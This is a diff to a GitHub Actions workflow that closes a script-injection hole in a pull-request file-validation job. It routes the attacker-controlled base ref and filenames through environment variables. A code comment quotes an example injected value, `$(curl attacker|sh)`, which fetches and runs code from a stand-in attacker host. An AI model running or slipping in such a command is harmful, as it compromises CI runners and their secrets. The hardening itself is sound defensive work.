@@ -18,13 +18,19 @@ jobs:
       - uses: actions/setup-node@v4
         with:
           node-version: 22
+      # Both the ref and the filenames are attacker-controlled on a fork PR.
+      # They go through env: and are quoted where they are used, so a branch
+      # or a file called `$(curl attacker|sh)` is a string and not a command.
       - name: List changed files
         id: files
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: |
-          git fetch origin ${{ github.base_ref }} --depth=1
-          echo "changed=$(git diff --name-only origin/${{ github.base_ref }}...HEAD | tr '\n' ' ')" >> "$GITHUB_OUTPUT"
+          git fetch origin "$BASE_REF" --depth=1
+          echo "changed=$(git diff --name-only "origin/$BASE_REF...HEAD" | tr '\n' ' ')" >> "$GITHUB_OUTPUT"
       - name: Validate
         env:
           PR_AUTHOR: ${{ github.event.pull_request.user.login }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: node scripts/validate.mjs ${{ steps.files.outputs.changed }}
+          CHANGED: ${{ steps.files.outputs.changed }}
+        run: node scripts/validate.mjs $CHANGED
